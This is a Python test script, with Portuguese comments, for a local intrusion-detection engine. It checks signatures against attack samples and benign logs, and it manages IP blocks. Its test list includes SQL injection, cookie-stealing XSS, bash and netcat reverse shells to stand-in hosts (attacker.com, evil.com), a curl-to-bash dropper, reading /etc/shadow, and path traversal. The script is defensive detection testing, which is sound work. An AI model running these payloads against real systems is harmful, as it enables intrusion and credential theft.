"""
NetGuard Lab v3.0 — Laboratório de Testes e Bloqueio
Testa assinaturas, valida falsos positivos, gerencia bloqueios.
Roda junto com o app.py (terminal separado).
"""

import sys, time, requests

API    = "http://localhost:5000/api"
IP_LAB = "192.168.15.200"   # IP de teste — nao existe na rede real

R='\033[91m'; G='\033[92m'; Y='\033[93m'; C='\033[96m'; B='\033[1m'; E='\033[0m'

def sec(t): print(f"\n{B}{C}{'─'*55}\n  {t}\n{'─'*55}{E}")
def ok(m):  print(f"  {G}✓ PASS{E}  {m}")
def fail(m):print(f"  {R}✗ FAIL{E}  {m}")
def info(m):print(f"  {C}·{E}      {m}")

def post(path, body):
    try:
        r = requests.post(f"{API}{path}",json=body,timeout=3)
        return r.json()
    except Exception as e:
        return {"error":str(e)}

def get(path):
    try:
        return requests.get(f"{API}{path}",timeout=3).json()
    except Exception as e:
        return {"error":str(e)}

def testar(desc, log, field="url", ip=IP_LAB, esperado=True):
    data = post("/analyze",{"log":log,"source_ip":ip,"field":field})
    encontrou = data.get("threats_found",0) > 0
    passou = encontrou == esperado
    if passou:
        if encontrou:
            d = data["detections"][0]
            ok(f"{desc} → [{d['severity'].upper()}] {d['threat_name']} ({round(d.get('confidence',1)*100)}%)")
        else:
            ok(f"{desc} → limpo (correto)")
    else:
        if esperado:
            fail(f"{desc} → NAO detectou (deveria!)")
        else:
            nomes = [d["threat_name"] for d in data.get("detections",[])]
            fail(f"{desc} → FALSO POSITIVO: {nomes}")
    return passou

def rodar_testes():
    passou = total = 0
    casos = [
        # ── SQL Injection ──
        ("SQL — UNION SELECT encodado",         "GET /login?id=1%20UNION%20SELECT%20null,null-- HTTP/1.1","url",IP_LAB,True),
        ("SQL — comment terminator",            "username=admin'--&password=x","query_string",IP_LAB,True),
        ("SQL — stacked DROP TABLE",            "id=1; DROP TABLE users; --","url",IP_LAB,True),
        ("SQL — SELECT legítimo em syslog",     "DEBUG: SELECT COUNT(*) FROM sessions WHERE active=1","syslog",IP_LAB,False),
        ("SQL — mysqldump legítimo",            "mysqldump: SELECT * FROM information_schema.tables completed","syslog",IP_LAB,False),
        # ── XSS ──
        ("XSS — script tag com cookie",        "<script>alert(document.cookie)</script>","body",IP_LAB,True),
        ("XSS — onerror com fetch",            '<img src=x onerror="fetch(document.cookie)">','body',IP_LAB,True),
        ("XSS — HTML legítimo",                '<div class="container"><p>Hello world</p></div>',"body",IP_LAB,False),
        # ── Command Injection ──
        ("CMD — reverse shell bash",           "bash -i >& /dev/tcp/attacker.com/4444 0>&1","command",IP_LAB,True),
        ("CMD — dropper curl|bash",            "curl http://evil.com/drop.sh | bash","command",IP_LAB,True),
        ("CMD — python reverse shell",         "python3 -c 'import socket; s=socket.socket()'","command",IP_LAB,True),
        ("CMD — netcat reverse shell",         "nc 10.0.0.1 4444 -e /bin/bash","command",IP_LAB,True),
        ("CMD — curl legítimo",               "curl https://api.github.com/repos","command",IP_LAB,False),
        # ── Privilege Escalation ──
        ("PRIV — sudo shell interativo",       "sudo /bin/bash","command",IP_LAB,True),
        ("PRIV — su para root",               "su - root","command",IP_LAB,True),
        ("PRIV — cat /etc/shadow",            "cat /etc/shadow","command",IP_LAB,True),
        ("PRIV — sudo apt (legítimo)",        "sudo apt-get update","command",IP_LAB,False),
        # ── Path Traversal ──
        ("PATH — 2 níveis de ../",            "GET /files/../../etc/passwd HTTP/1.1","url",IP_LAB,True),
        ("PATH — URL encodado %2e%2e",        "GET /%2e%2e/%2e%2e/etc/shadow","url",IP_LAB,True),
        ("PATH — 1 nível (legítimo)",         "GET /assets/../logo.png","url",IP_LAB,False),
        # ── Whitelist ──
        ("WL — 127.0.0.1 com SQLi",          "SELECT * FROM users UNION SELECT null","url","127.0.0.1",False),
        ("WL — gateway com shell",            "bash -i >& /dev/tcp/evil/4444 0>&1","command","192.168.15.1",False),
    ]

    sec("BATERIA COMPLETA DE TESTES")
    for desc,log,field,ip,esp in casos:
        total += 1
        if testar(desc,log,field,ip,esp): passou += 1
        time.sleep(0.05)

    # Brute force threshold
    sec("THRESHOLD — Brute Force SSH (5 falhas em 60s)")
    bf_ip  = "192.168.15.201"
    bf_log = f"Failed password for invalid user root from {bf_ip} port 22"
    detectou = False
    for i in range(1,7):
        data = post("/analyze",{"log":bf_log,"source_ip":bf_ip,"field":"syslog"})
        thresh = [d for d in data.get("detections",[]) if d.get("method")=="threshold"]
        if thresh:
            ok(f"Brute Force detectado na tentativa #{i} → {thresh[0]['threat_name']}")
            detectou = True; total += 1; passou += 1; break
        time.sleep(0.05)
    if not detectou:
        fail("Brute Force NAO detectado após 6 tentativas"); total += 1

    # Resumo
    sec("RESUMO")
    pct = round(passou/total*100,1) if total else 0
    cor = G if pct>=95 else Y if pct>=80 else R
    print(f"  {cor}{B}{passou}/{total} testes passaram ({pct}%){E}")
    if pct < 95:
        print(f"  {Y}Ajuste as assinaturas em ids_engine.py{E}")
    else:
        print(f"  {G}Engine validado — pronto para produção{E}")
    return pct >= 95

def menu_bloqueio():
    while True:
        print(f"\n{B}  Gerenciar Bloqueios{E}")
        print("  [1] Bloquear IP")
        print("  [2] Desbloquear IP")
        print("  [3] Listar bloqueados")
        print("  [0] Voltar")
        op = input("\n  Opção: ").strip()

        if op == "1":
            ip     = input("  IP a bloquear: ").strip()
            reason = input("  Motivo: ").strip() or "Bloqueio manual"
            if not ip: continue
            data = post("/block",{"ip":ip,"reason":reason})
            if data.get("success"):
                print(f"  {G}✓ {ip} bloqueado{E}")
                if data.get("note"): print(f"  {Y}Nota: {data['note']}{E}")
            else:
                print(f"  {R}✗ Falha: {data.get('error','erro desconhecido')}{E}")
                print(f"  {Y}Dica: Execute o PowerShell como Administrador{E}")

        elif op == "2":
            ip = input("  IP a desbloquear: ").strip()
            if not ip: continue
            r = requests.delete(f"{API}/block/{ip}",timeout=3)
            data = r.json()
            if data.get("success"): print(f"  {G}✓ {ip} desbloqueado{E}")
            else: print(f"  {R}✗ Falha{E}")

        elif op == "3":
            data = get("/block")
            blocked = data.get("blocked_ips",{})
            if blocked:
                print(f"\n  {B}IPs bloqueados:{E}")
                for ip,reason in blocked.items():
                    print(f"    {R}●{E} {ip} — {reason}")
            else:
                print(f"  {Y}Nenhum IP bloqueado{E}")

        elif op == "0":
            break

def menu_manual():
    print()
    log   = input("  Log/payload: ").strip()
    ip    = input(f"  IP origem (Enter = {IP_LAB}): ").strip() or IP_LAB
    field = input("  Campo [url/body/command/syslog/raw] (Enter=raw): ").strip() or "raw"
    print()
    data  = post("/analyze",{"log":log,"source_ip":ip,"field":field})
    if data.get("threats_found",0)==0:
        print(f"  {G}✓ Nenhuma ameaça detectada{E}")
    else:
        for d in data["detections"]:
            print(f"  {R}⚠ [{d['severity'].upper()}] {d['threat_name']}{E}")
            print(f"     {d['description']}")
            print(f"     MITRE: {d['mitre_tactic']}/{d['mitre_technique']} | Confiança: {round(d.get('confidence',1)*100)}%")

def main():
    print(f"\n{B}{C}")
    print("  ╔══════════════════════════════════════════════════╗")
    print("  ║  NetGuard Lab v3.0 — Testes e Bloqueios         ║")
    print(f"  ║  IP de lab: {IP_LAB}                      ║")
    print("  ╚══════════════════════════════════════════════════╝")
    print(E)

    try:
        h = get("/health")
        if "error" in h: raise Exception(h["error"])
        print(f"  {G}✓ IDS conectado{E} | assinaturas: {h.get('signatures_loaded')} | total: {h.get('total_detections')}")
        print(f"  Auto-block: {'ATIVO' if h.get('auto_block') else 'desativado'}")
    except Exception as e:
        print(f"  {R}✗ IDS offline — rode python app.py primeiro{E}")
        sys.exit(1)

    if len(sys.argv)>1 and sys.argv[1]=="test":
        ok_flag = rodar_testes()
        sys.exit(0 if ok_flag else 1)

    while True:
        print(f"\n{B}  Menu Principal{E}")
        print("  [1] Rodar bateria de testes")
        print("  [2] Testar log manualmente")
        print("  [3] Gerenciar bloqueios de IP")
        print("  [4] Ver estatísticas")
        print("  [0] Sair")
        op = input("\n  Opção: ").strip()

        if op=="1": rodar_testes()
        elif op=="2": menu_manual()
        elif op=="3": menu_bloqueio()
        elif op=="4":
            s = get("/statistics")
            print(f"\n  Total: {s.get('total',0)} | Crítico: {s.get('critical',0)} | Alto: {s.get('high',0)} | Médio: {s.get('medium',0)} | Baixo: {s.get('low',0)}")
            blocked = s.get("blocked_ips",{})
            print(f"  IPs bloqueados: {len(blocked)}")
            if blocked:
                for ip,r in blocked.items(): print(f"    {R}●{E} {ip} — {r}")
        elif op=="0":
            print(f"\n  {C}Encerrando...{E}\n"); break

if __name__=="__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n\n  {Y}Interrompido.{E}\n")
